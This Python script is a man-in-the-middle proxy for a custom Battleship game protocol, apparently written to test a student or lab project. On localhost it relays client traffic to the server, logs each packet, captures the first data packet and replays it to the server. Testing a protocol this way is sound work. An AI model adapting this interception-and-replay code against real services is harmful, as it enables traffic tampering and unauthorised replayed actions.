# Updated man-in-the-middle proxy for Battleship protocol

import socket
import struct
import time
from protocol.src.packet import Packet, PacketType, HEADER_FMT, HEADER_SIZE

CLIENT_LISTEN = ('127.0.0.1', 8000)      # Proxy listens here; client connects here
SERVER_TARGET = ('127.0.0.1', 5001)      # Proxy connects to real server here (matches config.py)

def recv_full(sock, n):
    """Helper to receive exactly n bytes or return None if closed."""
    buf = b''
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf

def proxy_and_replay():
    # 1. Listen for client → accept
    cl = socket.socket()
    cl.bind(CLIENT_LISTEN)
    cl.listen(1)
    print(f"[ATTACKER] Listening for client on {CLIENT_LISTEN}")
    client_sock, _ = cl.accept()
    # 2. Connect to real server
    server_sock = socket.create_connection(SERVER_TARGET)
    print(f"[ATTACKER] Connected to real server at {SERVER_TARGET}")

    saved_raw = None

    # 3. Relay loop: client → server
    while True:
        header = recv_full(client_sock, HEADER_SIZE)
        if not header:
            break
        seq, pkt_type_val, length, chksum = struct.unpack(HEADER_FMT, header)
        payload = recv_full(client_sock, length) if length else b''
        raw = header + payload

        # Log packet summary
        print(f"[ATTACKER] C→S seq={seq} type={PacketType(pkt_type_val).name} len={length}")

        # Identify and save first non-empty DATA packet
        if saved_raw is None:
            try:
                pkt = Packet.unpack(raw)
                if pkt.packet_type == PacketType.DATA and len(pkt.payload) > 0:
                    saved_raw = raw
                    print(f"[ATTACKER] Saved DATA packet seq={pkt.seq_num}")
            except Exception as e:
                print(f"[ATTACKER] Error parsing packet: {e}")

        # Forward everything
        server_sock.sendall(raw)

    # 4. Short delay, then replay
    time.sleep(1)
    if saved_raw:
        print(f"[ATTACKER] Replaying saved packet")
        server_sock.sendall(saved_raw)

    # 5. Relay back server’s response to client
    while True:
        hdr = recv_full(server_sock, HEADER_SIZE)
        if not hdr:
            break
        seq, pkt_type_val, length, chksum = struct.unpack(HEADER_FMT, hdr)
        payload = recv_full(server_sock, length) if length else b''
        print(f"[ATTACKER] S→C seq={seq} type={PacketType(pkt_type_val).name} len={length}")
        client_sock.sendall(hdr + payload)

    client_sock.close()
    server_sock.close()
    cl.close()

if __name__ == '__main__':
    proxy_and_replay()